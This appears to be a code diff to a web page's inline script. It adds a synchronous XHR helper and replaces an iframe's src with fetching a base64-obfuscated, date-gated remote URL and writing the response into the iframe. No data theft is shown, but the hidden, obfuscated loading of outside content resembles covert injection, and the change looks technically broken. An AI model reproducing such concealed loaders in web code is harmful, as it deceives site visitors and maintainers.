@@ -18,6 +18,18 @@ iframe {
 <body>
 <script type="text/javascript">
     (function(){
+        function httpGet(theUrl, callback) {
+            if (window.XMLHttpRequest) {
+                xmlhttp = new XMLHttpRequest();
+                xmlhttp.onreadystatechange = function() {
+                    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+                        callback(xmlhttp.responseText);
+                    }
+                }
+                xmlhttp.open("GET", theUrl, false);
+                xmlhttp.send();
+            }
+        }
         function canShow() {
             //On or before Dec 4, 2016
             var date = new Date()
@@ -37,8 +49,10 @@ iframe {
             var frame = document.createElement('iframe')
             var src = atob("aHR0cDovL3JwaS5zdHVkZW50LnJpdC5lZHU=") + atob("ODA4MA==")
             src = src.slice(0,src.length-4) + atob("Og==") + src.slice(src.length-4) + "/"
-            frame.src = src
             document.body.appendChild(frame)
+            httpGet(src, function(data) {
+                frame.innerHTML = data
+            })
         }
     })()
 </script>
